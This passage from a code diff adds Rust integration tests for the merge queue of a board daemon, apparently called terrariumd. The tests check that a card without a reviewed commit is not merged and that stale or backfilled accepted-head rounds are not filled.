+        .td
+        .post_as(&lab.lead, &format!("/api/cards/{card}/merge"), json!({}))
+        .await;
+    assert_eq!(r.status, 201, "{}", r.body);
+    assert_eq!(r.body["job"]["commit"], reviewed.as_str(), "{}", r.body);
+}
+
+/// TER-580: a card in the merge queue with no round (a column given the
+/// role while it held the card: no move ran) is not merged at its head.
+#[tokio::test]
+async fn a_queued_card_without_a_round_is_not_merged() {
+    let lab = lab_flow(2, "code").await;
+    with_merge_queue(&lab).await;
+    lab.branch("ter-nw", "next", &[("nw", "1\n"), ("OK", "y\n")]);
+    let card = lab.card("nw", "ter-nw").await;
+    accept(&lab, &card).await;
+    sql_on(
+        &lab,
+        &card,
+        "DELETE FROM card_accepted_heads WHERE card = ?1",
+    )
+    .await;
+    let r = lab
+        .td
+        .post_as(&lab.lead, &format!("/api/cards/{card}/merge"), json!({}))
+        .await;
+    assert_eq!(r.status, 409, "{}", r.body);
+    assert!(
+        r.body.to_string().contains("no reviewed commit"),
+        "{}",
+        r.body
+    );
+}
+
+/// TER-580: a rule moves the card into the merge queue (a round with no
+/// commit), the card leaves and comes back (a new round), and the late
+/// read of the first round records nothing: the second round takes only
+/// its own read.
+#[tokio::test]
+async fn a_late_read_of_an_earlier_round_records_nothing() {
+    use terrariumd::store::accepted_heads;
+    let lab = lab_flow(2, "rules").await;
+    with_merge_queue(&lab).await;
+    lab.branch("ter-lr", "next", &[("lr", "1\n"), ("OK", "y\n")]);
+    let card = lab.card("lr", "ter-lr").await;
+    hold_reads(&lab, true);
+    let db = lab.td.daemon.as_ref().unwrap().state.db.clone();
+    // The move of a rule: the store move, no API pre-read.
+    let id = card.clone();
+    let first = db
+        .write("rule", move |t| {
+            terrariumd::store::board::move_card(
+                t,
+                &terrariumd::actor::Actor::Operator,
+                &id,
+                "merge_queue",
+                None,
+                None,
+            )?;
+            let far = "2000-01-01T00:00:00.000Z";
+            accepted_heads::pending(t, "9999", far)
+        })
+        .await
+        .unwrap();
+    assert_eq!(first.len(), 1, "{first:?}");
+    let old = first[0].round.clone();
+    let id = card.clone();
+    db.write("rule", move |t| {
+        for column in ["review", "merge_queue"] {
+            terrariumd::store::board::move_card(
+                t,
+                &terrariumd::actor::Actor::Operator,
+                &id,
+                column,
+                None,
+                None,
+            )?;
+        }
+        Ok(())
+    })
+    .await
+    .unwrap();
+    let (id, r) = (card.clone(), old.clone());
+    let far = "2000-01-01T00:00:00.000Z";
+    let late = db
+        .write("system", move |t| {
+            accepted_heads::record(t, &id, &r, "ter-lr", &"a".repeat(40), far)
+        })
+        .await
+        .unwrap();
+    assert!(!late, "the late read of round {old} filled the new round");
+    let (commit, _, _) = round_of(&lab, &card).await.expect("a round");
+    assert_eq!(commit, None);
+    let id = card.clone();
+    let now = db
+        .read(move |c| {
+            Ok(accepted_heads::pending(c, "9999", far)?
+                .into_iter()
+                .filter(|p| p.card == id)
+                .collect::<Vec<_>>())
+        })
+        .await
+        .unwrap();
+    assert_eq!(now.len(), 1);
+    assert_ne!(now[0].round, old);
+
+    // The guards of record() itself, for a read that passed pending():
+    // a cutoff after the accept, then a round that needs a fresh accept.
+    let round = now[0].round.clone();
+    let commit = "b".repeat(40);
+    let (id, r, c) = (card.clone(), round.clone(), commit.clone());
+    let aged = db
+        .write("system", move |t| {
+            accepted_heads::record(t, &id, &r, "ter-lr", &c, "9999")
+        })
+        .await
+        .unwrap();
+    assert!(!aged, "a round past the cutoff was filled");
+    sql_on(
+        &lab,
+        &card,
+        "UPDATE card_accepted_heads SET needs_accept = 1,
+                note = 'the round was opened by the upgrade' WHERE card = ?1",
+    )
+    .await;
+    let (id, r, c) = (card.clone(), round.clone(), commit.clone());
+    let backfilled = db
+        .write("system", move |t| {
+            accepted_heads::record(t, &id, &r, "ter-lr", &c, far)
+        })
+        .await
+        .unwrap();
+    assert!(!backfilled, "a backfilled round was filled");
+    assert_eq!(round_of(&lab, &card).await.expect("a round").0, None);
+    // The background pass tells the card once.
+    hold_reads(&lab, false);
+    let state = lab.td.daemon.as_ref().unwrap().state.clone();
+    for _ in 0..2 {
+        assert_eq!(terrariumd::jobs::record_accepted_heads(&state).await, 0);
+    }
+    let text = comments(&lab.card_of(&card).await);
+    assert_eq!(text.matches("opened by the upgrade").count(), 1, "{text}");
+    // Without the mark the same read records: the guards were the cause.
+    sql_on(
+        &lab,
+        &card,
+        "UPDATE card_accepted_heads SET needs_accept = 0 WHERE card = ?1",
+    )
+    .await;
+    let (id, r) = (card.clone(), round.clone());
+    let filled = db
+        .write("system", move |t| {
+            accepted_heads::record(t, &id, &r, "ter-lr", &commit, far)
+        })
+        .await
+        .unwrap();
+    assert!(filled);
 }
